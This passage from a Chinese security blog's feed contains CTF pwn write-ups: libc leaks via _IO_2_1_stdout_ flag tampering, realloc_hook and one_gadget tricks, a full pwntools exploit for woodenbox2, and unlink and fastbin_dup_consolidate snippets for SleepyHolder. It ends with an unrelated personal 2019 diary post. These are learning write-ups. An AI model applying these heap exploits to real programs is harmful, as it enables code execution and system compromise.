0xFFFF0000</span><br><span class="line">#define _IO_USER_BUF 1 /* User owns buffer; don&apos;t delete it on close. */</span><br><span class="line">#define _IO_UNBUFFERED 2</span><br><span class="line">#define _IO_NO_READS 4 /* Reading not allowed */</span><br><span class="line">#define _IO_NO_WRITES 8 /* Writing not allowd */</span><br><span class="line">#define _IO_EOF_SEEN 0x10</span><br><span class="line">#define _IO_ERR_SEEN 0x20</span><br><span class="line">#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&apos;t call close(_fileno) on cleanup. */</span><br><span class="line">#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/</span><br><span class="line">#define _IO_IN_BACKUP 0x100</span><br><span class="line">#define _IO_LINE_BUF 0x200</span><br><span class="line">#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */</span><br><span class="line">#define _IO_CURRENTLY_PUTTING 0x800</span><br><span class="line">#define _IO_IS_APPENDING 0x1000</span><br><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line">#define _IO_BAD_SEEN 0x4000</span><br><span class="line">#define _IO_USER_LOCK 0x8000</span><br></pre></td></tr></table></figure><p>一种泄露libc的用法是添加_IO_CURRENTLY_PUTTING和 _IO_IS_APPENDING标志位，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flags,modified_flag;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    flags = <span class="built_in">stdout</span>-&gt;_flags;</span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_flags = <span class="number">0xfbad2087</span> | <span class="number">0x1000</span> | <span class="number">0x800</span>;</span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_IO_write_base -= <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flags: 0x%x\n"</span>, flags);</span><br><span class="line">    modified_flag = <span class="built_in">stdout</span>-&gt;_flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"modified_flag: 0x%x\n"</span>, modified_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">�����flags: 0xfbad2087</span><br><span class="line">modified_flag: 0xfbad3887</span><br></pre></td></tr></table></figure><h4 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h4><p>realloc_hook的常见利用方式是在使用one_gadget时平衡栈空间。</p><p>one_gadget如下：在使用时需要满足一些栈条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  woodenbox one_gadget ./libc6_2.23-0ubuntu11_amd64.so </span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>由于调用realloc回去查看realloc_hook是否存在，存在的话会先调用realloc_hook。realloc_hook的地址刚好在malloc_hook上面。常见手段为：在malloc_hook中写入realloc+n，在realloc_hook中写入one_gadget。调用malloc来触发one_gadget。</p><h3 id="例题：gxzyCTF-woodenbox2"><a href="#例题：gxzyCTF-woodenbox2" class="headerlink" title="例题：gxzyCTF woodenbox2"></a>例题：gxzyCTF woodenbox2</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  woodenbox checksec woodenbox2 </span><br><span class="line">[*] &apos;/mnt/hgfs/shared/gxzy/pwn/woodenbox/woodenbox2&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">➜  woodenbox ./woodenbox2</span><br><span class="line">----------------------------</span><br><span class="line">Wooden Box Menu</span><br><span class="line">----------------------------</span><br><span class="line">1.add a new item</span><br><span class="line">2.change the item in the box</span><br><span class="line">3.remove the item in the box</span><br><span class="line">4.exit</span><br><span class="line">----------------------------</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure><p>保护全开，没有show，基本是要想办法泄露libc。程序在change的时候存在堆溢出，因此可以利用overlapping。然后结合unsortedbin来爆破_IO_2_1_stdout_的地址，改变flag来泄露libc，最后将one_gadget写入malloc来getshell。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./woodenbox2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./woodenbox2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc6_2.23-0ubuntu11_amd64.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l,name)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"length of item name:"</span>,str(l))</span><br><span class="line">        p.sendlineafter(<span class="string">"name of item:"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,l,name)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"index of item:"</span>,str(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">"length of item name:"</span>,str(l))</span><br><span class="line">        p.sendlineafter(<span class="string">"new name of the item:"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"item:"</span>,str(idx))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#overlapping</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"0"</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"1"</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"2"</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"3"</span>*<span class="number">0x68</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">"6"</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">"7"</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#_IO_2_1_stdout_</span></span><br><span class="line">change(<span class="number">2</span>,<span class="number">0x32</span>,<span class="string">'5'</span>*<span class="number">0x28</span>+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"4"</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address = leak - (<span class="number">0x7ffff7a89b00</span> <span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">log.info(<span class="string">"libc_base:"</span>+hex(libc.address))</span><br><span class="line">__malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.info(<span class="string">'__malloc_hook:'</span>+hex(__malloc_hook))</span><br><span class="line">realloc = libc.symbols[<span class="string">'realloc'</span>]</span><br><span class="line">log.info(<span class="string">'realloc:'</span>+hex(realloc))</span><br><span class="line">one_gadget = libc.address+<span class="number">0x4526a</span></span><br><span class="line">log.info(<span class="string">'one_gadget:'</span>+hex(one))</span><br><span class="line"></span><br><span class="line"><span class="comment">#realloc_hook</span></span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x38</span>,<span class="string">'5'</span>*<span class="number">0x28</span>+p64(<span class="number">0x71</span>)+p64(__malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc))</span><br><span class="line">p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于堆溢出漏洞（例如off-by-one），常见的打法是overlapping造成double free，然后将one_gadget写入realloc_hook中。如果没有show操作，就可以利用_IO_1_2_stdout来泄漏libc。</p>]]></content>
    
    <summary type="html">
    
      当overlapping遇上_IO_2_1_stdout_，那么libc将无处遁形。
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="gxzy" scheme="https://j-kangel.github.io/tags/gxzy/"/>
    
  </entry>
  
  <entry>
    <title>&#39;fastbin_dup_consolidate与unlink天作之和&#39;</title>
    <link href="https://j-kangel.github.io/2020/03/12/fastbin-dup-consolidate%E4%B8%8Eunlink%E5%A4%A9%E4%BD%9C%E4%B9%8B%E5%92%8C/"/>
    <id>https://j-kangel.github.io/2020/03/12/fastbin-dup-consolidate与unlink天作之和/</id>
    <published>2020-03-12T14:22:31.000Z</published>
    <updated>2020-03-26T02:58:38.988Z</updated>
    
    <content type="html"><![CDATA[<h3 id="unlink攻击条件"><a href="#unlink攻击条件" class="headerlink" title="unlink攻击条件"></a>unlink攻击条件</h3><p>两个非fastbin大小的chunk, 如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0xf251f0:0x00000000000000000x0000000000000021 &lt;-fake_chunk</span><br><span class="line">0xf25200:0x00000000006020b80x00000000006020c0</span><br><span class="line">0xf25210:0x00000000000000200x0000000000000fb0 &lt;-chunk1</span><br><span class="line">0xf25220:0x00000000000000610x0000000000000000</span><br><span class="line">pwndbg&gt; x/gx 0x6020d0</span><br><span class="line">0x6020d0:0x0000000000f251f0</span><br></pre></td></tr></table></figure><p>其中fake_chunk处于释放状态，即chunk1的RPEV_INUSE=0。</p><p>fake_chunk-&gt;FD-&gt;BK=&amp;fake_chunk，即*(0xf251f0+0x10)+0x18 = 0x6020d0</p><p>fake_chunk-&gt;BK-&gt;FD=&amp;fake_chunk，即*(0xf251f0+0x18)+0x10 = 0x6020d0</p><p>chunk-&gt;prev_size = fake_chunk-&gt;size</p><p>攻击结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x6020d0</span><br><span class="line">0x6020d0:0x00000000006020b8</span><br></pre></td></tr></table></figure><h3 id="fastbin-dup-consolidate攻击效果"><a href="#fastbin-dup-consolidate攻击效果" class="headerlink" title="fastbin_dup_consolidate攻击效果"></a>fastbin_dup_consolidate攻击效果</h3><p>double free之后一个在fastbin中，一个在smallbin中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x603be0 ◂— 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x30 [corrupted]</span><br><span class="line">FD: 0x603be0 ◂— 0x0</span><br><span class="line">BK: 0x603be0 —▸ 0x7ffff7dd1b98 (main_arena+120) ◂— 0x603be0</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>这时候如果我们malloc(0x28)，该chunk虽然可以写入，但是属于一个被释放的smallbin，因此可以在构造该chunk为满足unlink的fake_chunk</p><h3 id="例题：hitcon2016-SleepyHolder"><a href="#例题：hitcon2016-SleepyHolder" class="headerlink" title="例题：hitcon2016-SleepyHolder"></a>例题：hitcon2016-SleepyHolder</h3><p>该程序功能如下：</p><p>1、keep secret(malloc)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">small serect：malloc(40)</span><br><span class="line">big secret: malloc(4000)</span><br><span class="line">huge secret: malloc(400000)</span><br></pre></td></tr></table></figure><p>2、wipe secret(free)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">small secret: 未清零，double free</span><br><span class="line">big seret: 未清零，double free</span><br></pre></td></tr></table></figure><p>3、renew secret(edit)</p><p>分析如下：</p><p>因为每个secret只能malloc一次，因此无法造成经典的fastbin_dup，但是可以造成fastbin_dup_consolidate</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后修改chunk1构造fake_chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f_ptr = <span class="number">0x6020d0</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fake_chunk += p64(f_ptr - <span class="number">0x18</span>) + p64(f_ptr<span class="number">-0x10</span>)</span><br><span class="line">fake_chunk += <span class="string">'\x20'</span></span><br><span class="line">add(<span class="number">1</span>, fake_chunk)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#unlink</span></span><br></pre></td></tr></table></figure><p>接下来就可以任意读写了，将free@got改为 puts@plt，泄露出libc基址，然后将free@got改为 system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">f = p64(<span class="number">0</span>) + p64(atoi_GOT) + p64(puts_GOT)</span><br><span class="line">f += p64(free_GOT) <span class="comment">#f_ptr = 0x6020d0</span></span><br><span class="line">f += p32(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">update(<span class="number">1</span>, f)</span><br><span class="line">update(<span class="number">1</span>, p64(puts_plt)) </span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">s = r.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = u64(s.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - atoi_offset</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">update(<span class="number">1</span>, p64(system))</span><br><span class="line">add(<span class="number">2</span>, <span class="string">'\bin\sh\x00'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      unlink想要的，正是fastbin_dup_consolidate想给的
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2019</title>
    <link href="https://j-kangel.github.io/2020/01/07/2019/"/>
    <id>https://j-kangel.github.io/2020/01/07/2019/</id>
    <published>2020-01-06T19:27:31.000Z</published>
    <updated>2020-01-07T03:27:19.035Z</updated>
    
    <content type="html"><![CDATA[<div class="note ">            <p>地铁没有坐正与坐反，只有起点和终点！</p>          </div><p>那是一个月黑风高的晚上，窗外刮着不太冷的寒风。我在庆祝新年的喧嚣声中小心翼翼的守护着那独一份的孤独，在百无聊赖之中，我在电脑上敲下了数行文字，用以记录上一年的某些事情，顺便聊以慰藉。就这样，我花了一个小时来记录我的2018，于此同时，我打算用一年的时光来书写我的2019。世事如影，诸君若闲，愿细数与听。</p><h4 id="开端"><a href="#开端" class="headerlink" title="开端"></a>开端</h4><p>人总向往诗和远方，却被生活种种束缚在了原地。阿磊跟我说：“十八岁计划出门远行，到现在还没有踏出一步。”我说：“不如今年寒假去西藏吧！”于是我们一拍即合，就这样踏上中国海拔最高的那片区域。我们先来到了武汉，顺便找了很久没见的阿峰吃了顿饭。阿峰是个很有意思的人，饭桌上我们都狂笑不止，谈论着往事与将来。</p><p>第二天我们坐动车来到了重庆。在阿磊同学的带领下，我们用半天时间品尝了磁器口的麻花，体验2号线的穿楼轻轨，吃了渝大师的中辣火锅，看到了灯光璀璨的洪崖洞。同行的还有多年未见的阿健，我跟阿健说：“雾锁山城山锁雾”，他回道：“山困雾都雾困山”。之后我们去了机场，在机场待了一宿第二天凌晨6点飞往拉萨。重庆是我待过的时间最短的城市，却给我一种玩了很久的感觉。我喜欢它那种古代与现代的完美结合，喜欢它好吃不贵的火锅以及入口即化的麻花。</p><p>第一次感受到西藏的与众不同之美便是在飞机上。我们快到西藏的时候正是朝阳出升的时候，然后最绚丽的不是飞在云端观看日出，而是彩虹机翼下那延绵不绝的雪山。我从未见过如此壮丽的大自然，或许是见识短浅，但那种感觉可以让人忘却一切烦恼。在飞机上认识了一位漂亮的藏族姑娘，她跟我讲述的许多当地的饮食于文华。下了飞机之后迎面扑来的是刺穿秋裤的寒气，也许此地别样的热情，连寒气都迫不及待的想与你来一场肌肤之亲。</p><p>冬天的西藏其实并没有那么寒冷，只是早晚温差比较大以及日出日落都很晚。我们在玛吉阿米喝了一壶甜茶，在大昭寺门前晒了会太阳，去布达拉宫买了条哈达，坐着大巴在最美的318国道上驰骋，去了湖水蓝如宝石的巴松，在藏民家里吃了牦牛粥喝了酥油茶，去了有“西藏江南”之称的林芝。一切犹如行云流水一般朴实无华且充满乐趣。</p><p>之后我们踏上了44小时的绿皮火车远下江南。</p><div class="note ">            <p>浊夜未央。清月渐凉。无睡意、偏倚寒窗。揭衣成被，落地为床。听欢声起，笑声伏，鼾声长。<br>    此生漫漫，皆在奔忙。几时能、闲下空想。乘风而去，踏雪回乡。携云一溪，酒一壶，琴一张。</p><pre><code>——《行香子·归途》</code></pre>          </div><h4 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h4><p>我们努力想让生活充实有趣且与众不同，但有些事却是生活中的一些地标，你可以绕弯，可以停留，但是必须经过那里。</p><p>这一年的春节最大的乐趣莫过于每晚的夜宵，我和老头小酌一杯之余将白天的剩菜一扫而光，其中我最爱的便是某一家的腊肠。</p><p>开学之后便忙着保研的诸多事宜，从资料收集，到关注消息，再到简历投递，每一环节看似自然却扣人心弦。</p><p>和学长们打了场国赛，第一天ak题目后我们点了披萨庆祝。</p><p>四月份的某天，我那蓄势已久的薰衣草突然在一场暴风之后接二连三的破土而出。一时间竟体会到小学作文中常写的：“我种下一颗种子，终于发出了芽。”</p><p>五一我回了趟家，跟家人一起去山里摘了树莓。上一次已是十多年前的事了。</p><p>六月份的某一天，我在宿舍看着猛龙打勇士。我知道那一天必将载入NBA史册。</p><p>考试结束后和阿九去了镇海角。</p><p>去了苏州参加国赛的半决赛。</p><p>七月份的某一天，我来到了上海参加上海交通大学的选拔。认识了阿馨，也见到了多年未见的阿彪。</p><p>在国赛失利之后，我开始学pwn，开始研究一些真实的漏洞，开始看一些书，开始有计划的刷题，开始用博客记录学习的过程，开始入门CTF。不巧的是，那时候《亲爱的热爱的》正在热播。</p><p>后面我去浙大之江实验室实习了一个月，参加了一次护网比赛。</p><p>暑假在家待了一个月，这大概是我十多年来，在家连续待得最久的一次。</p><p>开学去打了场工控安全竞赛，侥幸拿了二等奖。</p><h4 id="高潮"><a href="#高潮" class="headerlink" title="高潮"></a>高潮</h4><p>有些事情当时会让你觉得一夜成长，过后又云淡风轻。</p><p>9月15日</p><p>我预约了某照相馆的证件照之后，便一大早去了那里。由于来的太早，我在旁边的咖啡店点了一杯咖啡。我想让自己静下来，但是心却始终高悬不下。前一天晚上几个跟我一起报浙大的同学九推初审都过了，我却还没有结果。我跟阿峰说：“有没有什么能让我心情好一点，我现在很糟。“阿峰一开始不相信我这种人也会心情很糟，后来他推荐我去看脱口秀大会呼兰的段子。呼兰的段子是不错，可是这并不能让我轻松起来。我于是怀着这种心情拍完了证件照，我看了看证件照，白粉棕眉下隐藏的那种淡淡的忧伤还有点小帅，应该仅次于杜小帅了。没过多久，我便收到通过初审的短信。我又去看了两眼证件照，淡淡的忧伤下潜藏的未知的喜悦让小帅之余带点优雅，那时候我想，可以刚一刚杜小帅了。</p><p>9月23日</p><p>我和阿翼去了紫荆港参加机试。那时的阿翼，手握清华、人大、北航的offer，而我，空有清风，天气太热，连两袖都没有。就这样，它带着100分的机试成绩早早地出了考场，我带着63分的忧伤守候着结束的铃声。我一边埋怨自己为什么不多刷两道pat，一边吐槽着我一个CTF选手为啥要来参加机考，一边又赶紧找老师学长捞一波。一边绝望，一边又抱有希望。一边愤恨，一边又有点窃喜。我不知当时的我是怎样的的心情，只知道那天在酒店点的烧烤还挺香的。</p><p>9月24日</p><p>我和同行的几个小伙伴去参加面试。面试来了挺多人，大概就是传说中的各路牛鬼蛇神吧。按照我以往的尿性，面试十有八九都是“我跟你不熟，并不想听你叽里呱啦问七问八。”其实主要是，他们老问我一些不会的，让场面一度尴尬，让氛围瞬间如死水一般。果不其然，面试炸了。我只好寄希望于一方有难八方支援。从那一刻起，我的希望逐渐破灭，信心逐渐丧失，只剩下心悬一线。晚上坐在老师的车上，老师跟我说如果失败了你可以参加统考或者出国，我这边都可以帮你，我越听越绝望，不禁陷入了沉思，心随黑夜一般，不知几何，也不知代数。</p><p>9月25日</p><p>我早早地就醒了。我看了看墙上的电线，又去阳台站了许久。我从未体会那种内心的五味杂陈，这个词语我一般只在小说电影才看到，使用的时候也是那种为赋新词强说愁。我后来又回到了沙发上，在手机的便签上写下：</p><div class="note ">            <p>终于体会到了什么叫孤注一掷的煎熬，早上醒来，思绪就被打乱，无法再安心入眠。看到窗外的朝阳，觉得很美丽，但是不敢多看两眼。</p>          </div><p>9月26日</p><p>这天公布九推结果。我的结果是未录取。那是已是九推尾声，我手上还没有一个offer，意思就是我应该没有学校读了。从一开的壮志满怀到一落千丈只需要仅仅几天，这突然的一切让我猝不及防。我开始茶饭不思，神情恍惚，整个人如同行尸走肉。阿九见证了这一切。我只好将全部希望压在实验室导师身上，导师说，只要有人放弃就争取优先录取我。我打了个电话给辅导员，向他说明的情况，他让我盯紧一点。那一刻，我有燃起了一丝希望。阿九也许不知道这些。</p><p>9月27日</p><p>我回到了学校，回到了宿舍。我掩饰着内心的不安，与室友谈论着日常。阿仔告诉我可以提前联系一下前面录取的人，看有没有愿意放弃的。我试着做了，那一刻，我完全底下了高傲的头颅，询问他们是否愿意放弃名额。果然这招屡试不爽，一下子就联系到了五六个。我将这个消息告诉实验室的导师，导师也同样欣喜。导师告诉我说，会让学姐在招生办盯着，有人放弃就想办法捞我，我的希望之火又燃起了一些。到了晚上，大家都忙着填志愿。我知道那与我无关，但我依然选择一宿未眠，小心翼翼的守护着我那脆弱而又不堪一击的脆弱之火。</p><p>9月28号</p><p>早上7点，第一批录取已经结束。然后开始补录，直到下午5点。补录结束，而我的电话一整天都悄然无声。我当时在宿舍阳台上，看着学姐发给我：“补录结束了，我已经尽力了。“那几个字瞬间化作冰冷雨滴，将我的希望之火浇的一丝不剩。我突然内心一阵绞痛，蹲在了地上。当我再站起来的时候，我发现阳台的薰衣草已经枯萎。我跟阿润说我要找工作了，阿润说你即使去工作也不虚的。然后我开始告诉并且说服老头子我要去找工作。老头子并没说太多也没有反对。于是我去找了阿龙，阿龙说你就不要来和我们抢饭碗了，之后我们去喝了点小酒。在路上阿慈打电话来找我聊天，我告诉了他我的决定。喝酒的时候，导师打电话来说问我要不要直博，说有五成机会，我敷衍地答应了。</p><p>9月29号</p><p>早上醒来，老头子给我发了一大段作为父亲的不忍与承诺，我不知道如何回复。我和室友出门了，这天太阳格外耀眼。出门之前，我把蓄了很久的胡子刮了，突然感到一阵释怀。我不知道是释怀还是躲避，我内心还在想着直博的事。九点左右，上交招生办打来电话，说我前面还有一个同学如果放弃的话就补录到我了，我于是按照她的意思填了志愿。没过一会儿，复试通知下来了。我低头看了看短信，又抬头看了看天空，阳光洒在我的脸上，仿佛自由的雨滴。“有些鸟儿是终究关不住的，它们的羽毛太鲜艳了”。那是内心的自由，我仿佛压抑了很久很久。后来浙大的录取通知来了，我最终去了浙大。</p><p>也许正如某位老先生说的：</p><div class="note ">            